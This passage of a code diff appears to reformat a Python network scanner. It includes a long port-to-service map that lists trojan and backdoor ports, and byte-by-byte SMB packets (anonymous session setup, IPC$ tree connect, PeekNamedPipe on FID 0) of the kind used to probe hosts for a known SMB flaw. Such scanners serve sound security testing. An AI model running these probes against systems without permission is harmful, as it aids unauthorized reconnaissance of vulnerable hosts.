'flexlm7', 12346: 'NetBus', 13701: 'VeritasNetbackup', 6147: 'montage-lm', 4144: 'wincim', 4827: 'squid-htcp', 2049: 'nfs', 13717: 'VeritasNetbackup', 13705: 'VeritasNetbackup', 13706: 'VeritasNetbackup', 6148: 'ricardo-lm', 13718: 'VeritasNetbackup', 13708: 'VeritasNetbackup', 13709: 'VeritasNetbackup', 3128: 'squid-http', 13710: 'VeritasNetbackup', 3421: 'bmap', 2105: 'eklogin', 344: 'pdap', 345: 'pawserv', 346: 'zserv', 347: 'fatserv', 348: 'cis-sgwp', 2106: 'ekshell', 2401: 'cvspserver', 6502: 'netop-rc', 13713: 'VeritasNetbackup', 13714: 'VeritasNetbackup', 371: 'clearcase', 372: 'ulistserv', 373: 'legent-1', 374: 'legent-2', 375: 'hassle', 376: 'nip', 377: 'tnETOS', 378: 'dsETOS', 379: 'is99c', 380: 'is99s', 381: 'hp-collector', 382: 'hp-managed-node', 383: 'hp-alarm-mgr', 384: 'arns', 385: 'ibm-app', 386: 'asa', 387: 'aurp', 388: 'unidata-ldm', 389: 'ldap', 390: 'uis', 391: 'synotics-relay', 392: 'synotics-broker', 393: 'dis', 394: 'embl-ndt', 395: 'netcp', 396: 'netware-ip', 397: 'mptn', 398: 'kryptolan', 399: 'iso-tsap-c2', 400: 'work-sol', 401: 'ups', 402: 'genie', 403: 'decap', 404: 'nced', 405: 'ncld', 406: 'imsp', 407: 'timbuktu', 408: 'prm-sm', 409: 'prm-nm', 410: 'decladebug', 411: 'rmt', 412: 'synoptics-trap', 413: 'smsp', 414: 'infoseek', 415: 'bnet', 416: 'silverplatter', 417: 'onmux', 418: 'hyper-g', 419: 'ariel1', 420: 'smpte', 421: 'ariel2', 422: 'ariel3', 423: 'opc-job-start', 424: 'opc-job-track', 425: 'icad-el', 426: 'smartsdp', 427: 'svrloc', 428: 'ocs_cmu', 429: 'ocs_amu', 430: 'utmpsd', 431: 'utmpcd', 432: 'iasd', 433: 'nnsp', 434: 'mobileip-agent', 435: 'mobilip-mn', 436: 'dna-cml', 437: 'dna-cml', 438: 'dsfgw', 439: 'dasp', 440: 'sgcp', 441: 'decvms-sysmgt', 442: 'cvc_hostd', 443: 'https', 444: 'snpp', 445: 'microsoft-ds', 446: 'ddm-rdb', 447: 'ddm-dfm', 448: 'ddm-byte', 449: 'as-servermap', 450: 'tserver', 451: 'sfs-smp-net', 452: 'sfs-config', 453: 'creativeserver', 454: 'contentserver', 455: 'creativepartnr', 456: 'macon-tcp', 457: 'scohelp', 458: 'appleqtc', 459: 'ampr-rcmd', 460: 'skronk', 461: 'datasurfsrv', 462: 'datasurfsrvsec', 463: 'alpes', 464: 'kpasswd', 465: 'ssmtp', 466: 'digital-vrc', 467: 'mylex-mapd', 468: 'photuris', 469: 'rcp', 470: 'scx-proxy', 471: 'mondex', 472: 'ljk-login', 473: 'hybrid-pop', 474: 'tn-tl-w1', 475: 'tcpnethaspsrv', 6699: 'napster', 5540: 'sdreport', 500: 'isakmp', 501: 'stmf', 502: 'asa-appl-proto', 503: 'intrinsa', 504: 'citadel', 505: 'mailbox-lm', 506: 'ohimsrv', 507: 'crs', 508: 'xvttp', 509: 'snare', 510: 'fcp', 511: 'passgo', 512: 'exec', 513: 'login', 514: 'shell', 515: 'printer', 516: 'videotex', 517: 'talk', 518: 'ntalk', 519: 'utime', 520: 'efs', 521: 'ripng', 522: 'ulp', 523: 'ibm-db2', 524: 'ncp', 525: 'timed', 526: 'tempo', 527: 'stx', 528: 'custix', 529: 'irc-serv', 530: 'courier', 531: 'conference', 532: 'netnews', 533: 'netwall', 534: 'mm-admin', 535: 'iiop', 536: 'opalis-rdv', 537: 'nmsp', 538: 'gdomap', 539: 'apertus-ldp', 540: 'uucp', 541: 'uucp-rlogin', 542: 'commerce', 543: 'klogin', 544: 'kshell', 545: 'ekshell', 546: 'dhcpv6-client', 547: 'dhcpv6-server', 548: 'afpovertcp', 549: 'idfp', 550: 'new-rwho', 551: 'cybercash', 552: 'deviceshare', 553: 'pirp', 554: 'rtsp', 555: 'dsf', 556: 'remotefs', 557: 'openvms-sysipc', 558: 'sdnskmp', 559: 'teedtap', 560: 'rmonitor', 561: 'monitor', 562: 'chshell', 563: 'snews', 564: '9pfs', 565: 'whoami', 566: 'streettalk', 567: 'banyan-rpc', 568: 'ms-shuttle', 569: 'ms-rome', 570: 'meter', 571: 'umeter', 572: 'sonar', 573: 'banyan-vip', 574: 'ftp-agent', 575: 'vemmi', 576: 'ipcd', 577: 'vnas', 578: 'ipdd', 579: 'decbsrv', 580: 'sntp-heartbeat', 581: 'bdp', 582: 'scc-security', 583: 'philips-vc', 584: 'keyserver', 585: 'imap4-ssl', 586: 'password-chg', 587: 'submission', 588: 'cal', 589: 'eyelink', 590: 'tns-cml', 591: 'http-alt', 592: 'eudora-set', 593: 'http-rpc-epmap', 594: 'tpip', 595: 'cab-protocol', 596: 'smsd', 597: 'ptcnameservice', 598: 'sco-websrvrmg3', 599: 'acp', 600: 'ipcserver', 603: 'mnotes', 606: 'urm', 607: 'nqs', 608: 'sift-uft', 609: 'npmp-trap', 610: 'npmp-local', 611: 'npmp-gui', 617: 'sco-dtmgr', 5520: 'sdlog', 17007: 'isode-dua', 628: 'qmqp', 631: 'ipp', 634: 'ginad', 636: 'ldapssl', 637: 'lanserver', 2067: 'dlswpn', 660: 'mac-srvr-admin', 27006: 'flexlm6', 2500: 'rtsserv', 666: 'doom', 2068: 'advocentkvm', 2501: 'rtsclient', 674: 'acap', 3455: 'prsvp', 4660: 'mosmig', 32779: 'sometimes-rpc21', 691: 'resvc', 8888: 'sun-answerbook', 8892: 'seosload', 704: 'elcsd', 706: 'silc', 3531: 'peerenabler', 709: 'entrustmanager', 2766: 'listen', 4557: 'fax', 723: 'omfs', 729: 'netviewdm1', 730: 'netviewdm2', 731: 'netviewdm3', 2784: 'www-dev', 740: 'netcp', 741: 'netgw', 742: 'netrcs', 744: 'flexlm', 47557: 'dbbrowse', 747: 'fujitsu-dev', 748: 'ris-cm', 749: 'kerberos-adm', 750: 'rfile', 751: 'pump', 752: 'qrh', 753: 'rrh', 754: 'tell', 758: 'nlogin', 759: 'con', 760: 'ns', 761: 'rxe', 762: 'quotad', 763: 'cycleserv', 764: 'omserv', 765: 'webster', 767: 'phonebook', 769: 'vid', 770: 'cadlock', 771: 'rtip', 772: 'cycleserv2', 773: 'submit', 774: 'rpasswd', 775: 'entomb', 776: 'wpages', 13783: 'VeritasNetbackup', 780: 'wpgs', 781: 'hp-collector', 782: 'hp-managed-node', 783: 'spamassassin', 786: 'concert', 15126: 'swgps', 5550: 'sdadmind', 800: 'mdbs_daemon', 801: 'device', 4899: 'radmin', 808: 'ccproxy-http', 6969: 'acmsoda', 3456: 'vat', 27374: 'subseven', 32780: 'sometimes-rpc23', 6143: 'watershed-lm', 2065: 'dlsrpn', 7000: 'afs3-fileserver', 7001: 'afs3-callback', 7002: 'afs3-prserver', 7003: 'afs3-vlserver', 7004: 'afs3-kaserver', 7005: 'afs3-volser', 7006: 'afs3-errors', 1509: 'robcad-lm', 7008: 'afs3-update', 7009: 'afs3-rmtsys', 7010: 'ups-onlinet', 871: 'supfilesrv', 873: 'rsync', 16959: 'subseven', 2638: 'sybase', 8080: 'http-proxy', 17300: 'kuang2', 888: 'accessbuilder', 6144: 'statsci1-lm', 4987: 'maybeveritas', 27008: 'flexlm8', 898: 'sun-manageconsole', 901: 'samba-swat', 902: 'iss-realsecure-sensor', 903: 'iss-console-mgr', 5000: 'UPnP', 5001: 'commplex-link', 5002: 'rfe', 5003: 'filemaker', 9100: 'jetdirect', 5010: 'telelpathstart', 5011: 'telelpathattack', 5145: 'rmonitor_secure', 2201: 'ats', 2120: 'kauth', 7070: 'realserver', 4125: 'rww', 44442: 'coldfusion-auth', 7597: 'qaz', 5555: 'freeciv', 950: 'oftep-rpc', 3000: 'ppp', 953: 'rndc', 5050: 'mmcc', 5530: 'sdserv', 2053: 'knetd', 3006: 'deslogind', 9152: 'ms-sql2000', 5060: 'sip', 975: 'securenetpro-sensor', 3457: 'vat-control', 13722: 'VeritasNetbackup', 989: 'ftps-data', 990: 'ftps', 4480: 'proxy-plus', 992: 'telnets', 993: 'imaps', 994: 'ircs', 995: 'pop3s', 996: 'vsinet', 997: 'maitrd', 998: 'busboy', 999: 'garcon / puprouter', 1000: 'cadlock', 3049: 'cfs', 1002: 'windows-icfw', 3052: 'PowerChute', 5101: 'admdog', 5102: 'admeng', 1008: 'ufsd', 13782: 'VeritasNetbackup', 3064: 'dnet-tstproxy', 6543: 'mythtv', 5631: 'pcanywheredata', 1023: 'netvenuechat', 1024: 'kdm', 1025: 'NFS-or-IIS', 1026: 'LSA-or-nterm', 1027: 'IIS', 1029: 'ms-lsa', 1030: 'iad1', 1031: 'iad2', 1032: 'iad3', 1033: 'netinfo', 2903: 'extensisportfolio', 5490: 'connect-proxy', 3086: 'sj3', 1040: 'netsaint', 27665: 'Trinoo_Master', 1043: 'boinc-client', 4672: 'rfa', 2564: 'hp-3000-telnet', 1050: 'java-or-OTGfileshare', 8082: 'blackice-alerts', 7200: 'fodms', 7201: 'dlip', 1058: 'nim', 1059: 'nimreg', 31337: 'Elite', 8081: 'blackice-icecap', 1067: 'instl_boots', 1068: 'instl_bootc', 54320: 'bo2k', 2121: 'ccproxy-ftp', 2627: 'webster', 1076: 'sns_credit', 1080: 'socks', 1083: 'ansoft-lm-1', 1084: 'ansoft-lm-2', 6666: 'irc-serv', 6548: 'PowerChutePLUS', 32770: 'sometimes-rpc3', 5560: 'isqlplus', 3141: 'vmodem', 5190: 'aol', 5191: 'aol-1', 5192: 'aol-2', 5193: 'aol-3', 44334: 'tinyfw', 22370: 'hpnpd', 1103: 'xaudio', 2628: 'dict', 2232: 'ivs-video', 1109: 'kpop', 1110: 'nfsd-status', 1112: 'msql', 32771: 'sometimes-rpc5', 1127: 'supfiledbg', 5308: 'cfengine', 11371: 'pksd', 5232: 'sgi-dgl', 1139: 'cce3x', 5236: 'padl2sim', 32772: 'sometimes-rpc7', 1155: 'nfa', 1158: 'lsnr', 2241: 'ivsd', 3268: 'globalcatLDAP', 1178: 'skkserv', 32773: 'sometimes-rpc9', 7326: 'icb', 5300: 'hacl-hb', 5301: 'hacl-gs', 5302: 'hacl-cfg', 5303: 'hacl-probe', 5304: 'hacl-local', 5305: 'hacl-test', 1212: 'lupa', 6346: 'gnutella', 1214: 'fasttrack', 3264: 'ccmail', 1220: 'quicktime', 3269: 'globalcatLDAPssl', 1222: 'nerv', 1234: 'hotline', 9111: 'DragonIDSConsole', 32775: 'sometimes-rpc13', 1241: 'nessus', 6588: 'analogx', 3292: 'meetingmaker', 4133: 'nuts_bootp', 1248: 'hermes', 32787: 'sometimes-rpc27', 3306: 'mysql', 2600: 'zebrasrv', 32776: 'sometimes-rpc15', 2601: 'zebra', 2602: 'ripd', 9999: 'abyss', 2603: 'ripngd', 3333: 'dec-notes', 2604: 'ospfd', 9090: 'zeus-admin', 2605: 'bgpd', 18183: 'opsec_sam', 32777: 'sometimes-rpc17', 2430: 'venus', 5400: 'pcduo-old', 44443: 'coldfusion-auth', 5405: 'pcduo', 5680: 'canna', 4998: 'maybeveritas', 7464: 'pythonds', 3372: 'msdtc', 18184: 'opsec_lea', 18187: 'opsec_ela', 7273: 'openmanage', 5432: 'postgres', 1337: 'waste', 3389: 'ms-term-serv', 9535: 'man', 1346: 'alta-ana-lm', 1347: 'bbn-mmc', 1348: 'bbn-mmx', 1349: 'sbook', 1350: 'editbench', 1351: 'equationbuilder', 1352: 'lotusnotes', 1353: 'relief', 1354: 'rightbrain', 1355: 'intuitive-edge', 1356: 'cuillamartin', 1357: 'pegboard', 1358: 'connlcli', 1359: 'ftsrv', 1360: 'mimer', 1361: 'linx', 1362: 'timeflies', 1363: 'ndm-requester', 1364: 'ndm-server', 1365: 'adapt-sna', 1366: 'netware-csp', 1367: 'dcs', 1368: 'screencast', 1369: 'gv-us', 1370: 'us-gv', 1371: 'fc-cli', 1372: 'fc-ser', 1373: 'chromagrafx', 1374: 'molly', 1375: 'bytex', 1376: 'ibm-pps', 1377: 'cichlid', 1378: 'elan', 1379: 'dbreporter', 1380: 'telesis-licman', 1381: 'apple-licman', 1383: 'gwha', 1384: 'os-licman', 1385: 'atex_elmd', 1386: 'checksum', 1387: 'cadsi-lm', 1388: 'objective-dbc', 1389: 'iclpv-dm', 1390: 'iclpv-sc', 1391: 'iclpv-sas', 1392: 'iclpv-pm', 1393: 'iclpv-nls', 1394: 'iclpv-nlc', 1395: 'iclpv-wsm', 1396: 'dvl-activemail', 1397: 'audio-activmail', 1398: 'video-activmail', 1399: 'cadkey-licman', 1400: 'cadkey-tablet', 1401: 'goldleaf-licman', 1402: 'prm-sm-np', 1403: 'prm-nm-np', 1404: 'igi-lm', 1405: 'ibm-res', 1406: 'netlabs-lm', 1407: 'dbsa-lm', 1408: 'sophia-lm', 1409: 'here-lm', 1410: 'hiq', 1411: 'af', 1412: 'innosys', 1413: 'innosys-acl', 1414: 'ibm-mqseries', 1415: 'dbstar', 1416: 'novell-lu6.2', 1417: 'timbuktu-srv1', 1418: 'timbuktu-srv2', 1419: 'timbuktu-srv3', 1420: 'timbuktu-srv4', 1421: 'gandalf-lm', 1422: 'autodesk-lm', 1423: 'essbase', 1424: 'hybrid', 1425: 'zion-lm', 1426: 'sas-1', 1427: 'mloadd', 1428: 'informatik-lm', 1429: 'nms', 1430: 'tpdu', 1431: 'rgtp', 1432: 'blueberry-lm', 1433: 'ms-sql-s', 1434: 'ms-sql-m', 1435: 'ibm-cics', 1436: 'sas-2', 1437: 'tabula', 1438: 'eicon-server', 1439: 'eicon-x25', 1440: 'eicon-slp', 1441: 'cadis-1', 1442: 'cadis-2', 1443: 'ies-lm', 1444: 'marcam-lm', 1445: 'proxima-lm', 1446: 'ora-lm', 1447: 'apri-lm', 1448: 'oc-lm', 1449: 'peport', 1450: 'dwf', 1451: 'infoman', 1452: 'gtegsc-lm', 1453: 'genie-lm', 1454: 'interhdl_elmd', 1455: 'esl-lm', 1456: 'dca', 1457: 'valisys-lm', 1458: 'nrcabq-lm', 1459: 'proshare1', 1460: 'proshare2', 1461: 'ibm_wrless_lan', 1462: 'world-lm', 1463: 'nucleus', 1464: 'msl_lmd', 1465: 'pipes', 1466: 'oceansoft-lm', 1467: 'csdmbase', 1468: 'csdm', 1469: 'aal-lm', 1470: 'uaiact', 1471: 'csdmbase', 1472: 'csdm', 1473: 'openmath', 1474: 'telefinder', 1475: 'taligent-lm', 1476: 'clvm-cfg', 1477: 'ms-sna-server', 1478: 'ms-sna-base', 1479: 'dberegister', 1480: 'pacerforum', 1481: 'airs', 1482: 'miteksys-lm', 1483: 'afs', 1484: 'confluent', 1485: 'lansource', 1486: 'nms_topo_serv', 1487: 'localinfosrvr', 1488: 'docstor', 1489: 'dmdocbroker', 1490: 'insitu-conf', 1491: 'anynetgateway', 1492: 'stone-design-1', 1493: 'netmap_lm', 1494: 'citrix-ica', 1495: 'cvc', 1496: 'liberty-lm', 1497: 'rfx-lm', 1498: 'watcom-sql', 1499: 'fhc', 1500: 'vlsi-lm', 1501: 'sas-3', 1502: 'shivadiscovery', 1503: 'imtc-mcs', 1504: 'evb-elm', 1505: 'funkproxy', 1506: 'utcd', 1507: 'symplex', 1508: 'diagmond', 40421: 'trojan[Agent 40421]', 1510: 'mvx-lm', 1511: '3l-l1', 1512: 'wins', 1513: 'fujitsu-dtc', 1514: 'fujitsu-dtcns', 1515: 'ifor-protocol', 1516: 'vpad', 1517: 'vpac', 1518: 'vpvd', 1519: 'vpvc', 1520: 'atm-zip-office', 1521: 'oracle', 1522: 'rna-lm', 1523: 'cichild-lm', 1524: 'ingreslock', 1525: 'orasrv', 1526: 'pdap-np', 1527: 'tlisrv', 1528: 'mciautoreg', 1529: 'support', 1530: 'rap-service', 1531: 'rap-listen', 1532: 'miroconnect', 1533: 'virtual-places', 1534: 'micromuse-lm', 1535: 'ampr-info', 1536: 'ampr-inter', 1537: 'sdsc-lm', 1538: '3ds-lm', 1539: 'intellistor-lm', 1540: 'rds', 1541: 'rds2', 1542: 'gridgen-elmd', 1543: 'simba-cs', 1544: 'aspeclmd', 1545: 'vistium-share', 1546: 'abbaccuray', 1547: 'laplink', 1548: 'axon-lm', 1549: 'shivahose', 1550: '3m-image-lm', 1551: 'hecmtl-db', 1552: 'pciarray', 7007: 'afs3-bos', 6667: 'irc', 32786: 'sometimes-rpc25', 13711: 'VeritasNetbackup', 20005: 'btx', 3462: 'track', 5679: 'activesync', 3632: 'distccd', 6668: 'irc', 1600: 'issd', 2998: 'iss-realsec', 18000: 'biimenu', 5713: 'proshareaudio', 5714: 'prosharevideo', 5715: 'prosharedata', 5716: 'prosharerequest', 5717: 'prosharenotify', 3001: 'nessusd', 26208: 'wnn6_DS', 19150: 'gkrellmd', 5510: 'secureidprop', 3689: 'rendezvous', 3005: 'deslogin', 1650: 'nkd', 1651: 'shiva_confsrvr', 1652: 'xnmp', 8443: 'https-alt', 1661: 'netview-aix-1', 1662: 'netview-aix-2', 1663: 'netview-aix-3', 1664: 'netview-aix-4', 1665: 'netview-aix-5', 1666: 'netview-aix-6', 1667: 'netview-aix-7', 1668: 'netview-aix-8', 1669: 'netview-aix-9', 1670: 'netview-aix-10', 1671: 'netview-aix-11', 1672: 'netview-aix-12', 13712: 'VeritasNetbackup', 1680: 'CarbonCopy', 9876: 'sd', 5800: 'vnc-http', 5801: 'vnc-http-1', 5802: 'vnc-http-2', 5803: 'vnc-http-3', 6558: 'xdsxdm', 1720: 'H.323/Q.931', 1723: 'pptp', 4444: 'krb524', 27009: 'flexlm9', 4045: 'lockd', 4559: 'hylafax', 1755: 'wms', 12000: 'cce4x', 1761: 'landesk-rc', 1762: 'landesk-rc', 1763: 'landesk-rc', 1764: 'landesk-rc', 2112: 'kip', 6401: 'crystalenterprise', 6101: 'VeritasBackupExec', 7937: 'nsrexecd', 7938: 'lgtomapper', 18181: 'opsec_cvp', 18182: 'opsec_ufp', 9991: 'issa', 9992: 'issc', 18185: 'opsec_omi', 6103: 'RETS-or-BackupExec', 5900: 'vnc', 5901: 'vnc-1', 5902: 'vnc-2', 5903: 'vnc-3', 10000: 'snet-sensor-mgmt', 22289: 'wnn6_Cn', 10005: 'stel', 6105: 'isdninfo', 6106: 'isdninfo', 22305: 'wnn6_Kr', 1827: 'pcm', 22321: 'wnn6_Tw', 6110: 'softcm', 6111: 'spc', 3900: 'udt_os', 8000: 'http-alt', 6112: 'dtspc', 8007: 'ajp12', 8009: 'ajp13', 8021: 'ftp-proxy', 22273: 'wnn6', 5977: 'ncd-pref-tcp', 5978: 'ncd-diag-tcp', 5979: 'ncd-conf-tcp', 27000: 'flexlm0', 10082: 'amandaidx', 10083: 'amidxtape', 13702: 'VeritasNetbackup', 1900: 'UPnP', 5997: 'ncd-pref', 5998: 'ncd-diag', 5999: 'ncd-conf', 6000: 'X11', 6001: 'X11:1', 6002: 'X11:2', 6003: 'X11:3', 6004: 'X11:4', 6005: 'X11:5', 6006: 'X11:6', 6007: 'X11:7', 6008: 'X11:8', 6009: 'X11:9', 27001: 'flexlm1', 6017: 'xmail-ctrl', 5100: 'admd', 4224: 'xtell', 1935: 'rtmp', 3984: 'mapper-nodemgr', 3985: 'mapper-mapethd', 3986: 'mapper-ws_ethd', 5632: 'pcanywherestat', 4500: 'sae-urn', 13720: 'VeritasNetbackup', 27002: 'flexlm2', 3999: 'remoteanything', 4000: 'remoteanything', 6050: 'arcserve', 4008: 'netcheque', 2111: 'kx', 6544: 'mythtv', 2809: 'corbaloc', 1984: 'bigbrother', 1986: 'licensedaemon', 1987: 'tr-rsrb-p1', 1988: 'tr-rsrb-p2', 1989: 'tr-rsrb-p3', 1990: 'stun-p1', 1991: 'stun-p2', 1992: 'stun-p3', 1993: 'snmp-tcp-port', 1994: 'stun-port', 1995: 'perf-port', 1996: 'tr-rsrb-port', 1997: 'gdp-port', 1998: 'x25-svc-port', 1999: 'tcp-id-port', 2000: 'callbook', 2001: 'dc', 2002: 'globe', 2003: 'cfingerd', 2004: 'mailbox', 2005: 'deslogin', 2006: 'invokator', 2007: 'dectalk', 2008: 'conf', 2009: 'news', 2010: 'search', 2011: 'raid-cc', 2012: 'ttyinfo', 2013: 'raid-am', 2014: 'troff', 2015: 'cypress', 2016: 'bootserver', 2017: 'cypress-stat', 2018: 'terminaldb', 2019: 'whosockami', 2020: 'xinupageserver', 2021: 'servexec', 2022: 'down', 2023: 'xinuexpansion3', 2024: 'xinuexpansion4', 2025: 'ellpack', 2026: 'scrabble', 2027: 'shadowserver', 2028: 'submitserver', 2030: 'device2', 6141: 'meta-corp', 2032: 'blackboard', 2033: 'glogger', 2034: 'scoremgr', 2035: 'imsldoc', 6142: 'aspentec-lm', 2038: 'objectmanager', 2040: 'lam', 2041: 'interbase', 2042: 'isis', 2043: 'isis-bcast', 2044: 'rimsl', 2045: 'cdfunc', 2046: 'sdfunc', 2047: 'dls'}
+
     try:
         return service_list[port]
     except:
         return "unknown"
+
 
 # Negotiate Protocol Request
 # packetnego = "\x00\x00\x00\x54" # Session Message
@@ -5576,107 +5772,110 @@ def service(port):
 
 packetnego = "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x01\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xb9\x4a\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"
 
+
 def handle(data, iptarget):
     ## SMB Command: Session Setup AndX Request, User: .\
     if data[8:10] == "\x72\x00":
 
-        packetsession = "\xff\x53\x4d\x42"# Server Component: SMB
-        packetsession += "\x73" # SMB Command: Session Setup AndX (0x73)
-        packetsession += "\x00" # Error Class: Success (0x00)
-        packetsession += "\x00" # Reserved
-        packetsession += "\x00\xc0" # Error Code: No Error
-        packetsession += "\x98" # Flags
-        packetsession += "\x01\x48" # Flags 2
-        packetsession += "\x00\x00" # Process ID High 0
-        packetsession += "\x00\x00\x00\x00\x00\x00\x00\x00" # Signature
-        packetsession += "\x00\x00" # Reserved
-        packetsession += data[28:34] # TID+PID+UID
-        packetsession += "\xff\xff" # Multiplex ID 49474
-        packetsession += "\x0d" # WCT 0
-        packetsession += "\xff" # AndXCommand: No further commands (0xff)
-        packetsession += "\x00" # Reserved 00
-        packetsession += "\x00\x00" # AndXOffset: 0
-        packetsession += "\xdf\xff" # Max Buffer: 65503
-        packetsession += "\x02\x00" # Max Mpx Count: 2
-        packetsession += "\x01\x00" # VC Number: 1
-        packetsession += "\x00\x00\x00\x00" # Session Key: 0x00000000
-        packetsession += "\x00\x00" # ANSI Password Length: 0
-        packetsession += "\x00\x00" # Unicode Password Length: 0
-        packetsession += "\x00\x00\x00\x00" # Reserved: 00000000
-        packetsession += "\x40\x00\x00\x00" # Capabilities: 0x00000040, NT Status Codes
-        packetsession += "\x26\x00" # Byte Count (BCC): 38
-        packetsession += "\x00" # Account:
-        packetsession += "\x2e\x00" # Primary Domain: .
-        packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00" # Native OS: Windows 2000 2195
-        packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x32\x00" # Native LAN Manager: Windows 2000 5.0
+        packetsession = "\xff\x53\x4d\x42"  # Server Component: SMB
+        packetsession += "\x73"  # SMB Command: Session Setup AndX (0x73)
+        packetsession += "\x00"  # Error Class: Success (0x00)
+        packetsession += "\x00"  # Reserved
+        packetsession += "\x00\xc0"  # Error Code: No Error
+        packetsession += "\x98"  # Flags
+        packetsession += "\x01\x48"  # Flags 2
+        packetsession += "\x00\x00"  # Process ID High 0
+        packetsession += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
+        packetsession += "\x00\x00"  # Reserved
+        packetsession += data[28:34]  # TID+PID+UID
+        packetsession += "\xff\xff"  # Multiplex ID 49474
+        packetsession += "\x0d"  # WCT 0
+        packetsession += "\xff"  # AndXCommand: No further commands (0xff)
+        packetsession += "\x00"  # Reserved 00
+        packetsession += "\x00\x00"  # AndXOffset: 0
+        packetsession += "\xdf\xff"  # Max Buffer: 65503
+        packetsession += "\x02\x00"  # Max Mpx Count: 2
+        packetsession += "\x01\x00"  # VC Number: 1
+        packetsession += "\x00\x00\x00\x00"  # Session Key: 0x00000000
+        packetsession += "\x00\x00"  # ANSI Password Length: 0
+        packetsession += "\x00\x00"  # Unicode Password Length: 0
+        packetsession += "\x00\x00\x00\x00"  # Reserved: 00000000
+        packetsession += "\x40\x00\x00\x00"  # Capabilities: 0x00000040, NT Status Codes
+        packetsession += "\x26\x00"  # Byte Count (BCC): 38
+        packetsession += "\x00"  # Account:
+        packetsession += "\x2e\x00"  # Primary Domain: .
+        packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00"  # Native OS: Windows 2000 2195
+        packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x32\x00"  # Native LAN Manager: Windows 2000 5.0
 
-        return struct.pack(">i", len(packetsession))+packetsession
+        return struct.pack(">i", len(packetsession)) + packetsession
 
     ## Tree Connect AndX Request, Path: \\ip\IPC$
     if data[8:10] == "\x73\x00":
 
-        share = "\xff\x53\x4d\x42"# Server Component: SMB
-        share += "\x75" # SMB Command: Tree Connect AndX (0x75)
-        share += "\x00" # Error Class: Success (0x00)
-        share += "\x00" # Reserved
-        share += "\x00\x00"# Error Code: No Error
-        share += "\x18" # Flags
-        share += "\x01\x48" # Flags 2
-        share += "\x00\x00" # Process ID High 0
-        share += "\x00\x00\x00\x00\x00\x00\x00\x00" # Signature
-        share += "\x00\x00" # Reserved
-        share += data[28:34] # TID+PID+UID
-        share += "\x00\x00" # Multiplex ID 49474
-        share += "\x04" # WCT 4
-        share += "\xff" # AndXCommand: No further commands (0xff)
-        share += "\x00" # Reserved: 00
-        share += "\x00\x00" # AndXOffset: 0
-        share += "\x00\x00" # Flags: 0x0000
-        share += "\x01\x00" # Password Length: 1
-        share += "\x17\x00" # Byte Count (BCC): 25
-        share += "\x00" # Password: 00
-        share += "\x5c\x5c"+iptarget+"\x5c\x49\x50\x43\x24\x00" # Path: \\ip_target\IPC$
+        share = "\xff\x53\x4d\x42"  # Server Component: SMB
+        share += "\x75"  # SMB Command: Tree Connect AndX (0x75)
+        share += "\x00"  # Error Class: Success (0x00)
+        share += "\x00"  # Reserved
+        share += "\x00\x00"  # Error Code: No Error
+        share += "\x18"  # Flags
+        share += "\x01\x48"  # Flags 2
+        share += "\x00\x00"  # Process ID High 0
+        share += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
+        share += "\x00\x00"  # Reserved
+        share += data[28:34]  # TID+PID+UID
+        share += "\x00\x00"  # Multiplex ID 49474
+        share += "\x04"  # WCT 4
+        share += "\xff"  # AndXCommand: No further commands (0xff)
+        share += "\x00"  # Reserved: 00
+        share += "\x00\x00"  # AndXOffset: 0
+        share += "\x00\x00"  # Flags: 0x0000
+        share += "\x01\x00"  # Password Length: 1
+        share += "\x17\x00"  # Byte Count (BCC): 25
+        share += "\x00"  # Password: 00
+        share += (
+            "\x5c\x5c" + iptarget + "\x5c\x49\x50\x43\x24\x00"
+        )  # Path: \\ip_target\IPC$
         share += "\x3f\x3f\x3f\x3f\x3f\x00"
 
-        return struct.pack(">i", len(share))+share
+        return struct.pack(">i", len(share)) + share
 
     ## PeekNamedPipe Request, FID: 0x0000
     if data[8:10] == "\x75\x00":
 
-        smbpipefid0 = "\xff\x53\x4d\x42"# Server Component: SMB
-        smbpipefid0 += "\x25" # SMB Command: Trans (0x25)
-        smbpipefid0 += "\x00" # Error Class: Success (0x00)
-        smbpipefid0 += "\x00" # Reserved
-        smbpipefid0 += "\x00\x00"# Error Code: No Error
-        smbpipefid0 += "\x18" # Flags
-        smbpipefid0 += "\x01\x28" # Flags 2
-        smbpipefid0 += "\x00\x00" # Process ID High 0
-        smbpipefid0 += "\x00\x00\x00\x00\x00\x00\x00\x00" # Signature
-        smbpipefid0 += "\x00\x00" # Reserved
-        smbpipefid0 += data[28:34] # TID+PID+UID
-        smbpipefid0 += "\x42\xc1" # Multiplex ID 49474
-        smbpipefid0 += "\x10" # Word Count (WCT): 16
-        smbpipefid0 += "\x00\x00" # Total Parameter Count: 0
-        smbpipefid0 += "\x00\x00" # Total Data Count: 0
-        smbpipefid0 += "\xff\xff" # Max Parameter Count: 65535
-        smbpipefid0 += "\xff\xff" # Max Data Count: 65535
-        smbpipefid0 += "\x00" # Max Setup Count: 0
-        smbpipefid0 += "\x00" # Reserved: 00
-        smbpipefid0 += "\x00\x00" # Flags: 0x0000
-        smbpipefid0 += "\x00\x00\x00\x00" # Timeout: Return immediately (0)
-        smbpipefid0 += "\x00\x00" # Reserved: 0000
-        smbpipefid0 += "\x00\x00" # Parameter Count: 0
-        smbpipefid0 += "\x4a\x00" # Parameter Offset: 74
-        smbpipefid0 += "\x00\x00" # Data Count: 0
-        smbpipefid0 += "\x4a\x00" # Data Offset: 74
-        smbpipefid0 += "\x02" # Setup Count: 2
-        smbpipefid0 += "\x00" # Reserved: 00
-        smbpipefid0 += "\x23\x00" # Function: PeekNamedPipe (0x0023)
-        smbpipefid0 += "\x00\x00" # FID: 0x0000
-        smbpipefid0 += "\x07\x00" # Byte Count (BCC): 7
-        smbpipefid0 += "\x5c\x50\x49\x50\x45\x5c\x00" # Transaction Name: \PIPE\
+        smbpipefid0 = "\xff\x53\x4d\x42"  # Server Component: SMB
